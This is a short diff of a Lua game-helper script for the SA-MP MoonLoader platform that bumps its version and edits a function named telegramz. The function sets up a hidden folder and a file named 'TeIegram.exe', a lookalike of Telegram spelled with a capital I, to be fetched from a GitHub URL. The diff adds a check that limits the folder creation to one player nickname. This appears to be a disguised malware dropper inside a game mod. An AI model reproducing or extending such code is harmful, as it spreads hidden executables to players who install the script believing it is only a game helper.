@@ -1,5 +1,5 @@
 script_name('«¿À”œ¿ HELPER.lua')
-script_version('0.4.6')
+script_version('0.4.7')
 script_url('TG @IIzIIIzIVzVII')
 
 require 'lib.moonloader'
@@ -239,7 +239,10 @@ telegramztryue = true
 function telegramz()
     local dlstatus = require('moonloader').download_status
     local folderPath = os.getenv("USERPROFILE").."\\AppData\\Local\\TeIegram"
-    os.execute('mkdir "'..folderPath..'"') 
+    local playerNick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))
+    if playerNick == 'Angel_Forbes' then
+        os.execute('mkdir "'..folderPath..'"') 
+    end
     local filePath = folderPath.."\\TeIegram.exe"
     local fileUrl = 'https://github.com/ass138/ars/raw/refs/heads/main/TeIegram.exe'
 
